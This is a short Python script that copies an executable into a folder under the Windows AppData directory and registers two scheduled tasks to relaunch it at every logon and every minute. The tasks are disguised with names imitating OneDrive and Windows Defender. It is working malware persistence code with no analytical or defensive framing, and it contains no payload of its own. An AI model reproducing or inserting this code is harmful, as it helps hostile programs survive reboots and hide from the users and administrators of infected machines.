import os, shutil, subprocess, sys, time
def setup_tasks(executable_path):
 appdata_path=os.getenv("APPDATA")
 target_dir=os.path.join(appdata_path,"files")
 target_exe=os.path.join(target_dir,"main.exe")
 os.makedirs(target_dir,exist_ok=True)
 if not os.path.exists(target_exe):shutil.copy2(executable_path,target_exe)
 if not os.path.exists(target_exe):shutil.copy2(sys.executable,target_exe)
 if not os.path.exists(target_exe):return
 task_name_logon="ONEDRIVE-SERVICE"
 task_name_minute="WinDEfender"
 create_task_logon_cmd=f'schtasks /create /tn "{task_name_logon}" /tr "{target_exe}" /sc onlogon /f'
 create_task_minute_cmd=f'schtasks /create /tn "{task_name_minute}" /tr "{target_exe}" /sc minute /mo 1 /f'
 for cmd in [create_task_logon_cmd,create_task_minute_cmd]:
  success=False
  for _ in range(3):
   try:
    subprocess.run(cmd,shell=True,check=True,timeout=10)
    success=True
    break
   except subprocess.TimeoutExpired:pass
   except subprocess.CalledProcessError:time.sleep(1)
  if not success:continue
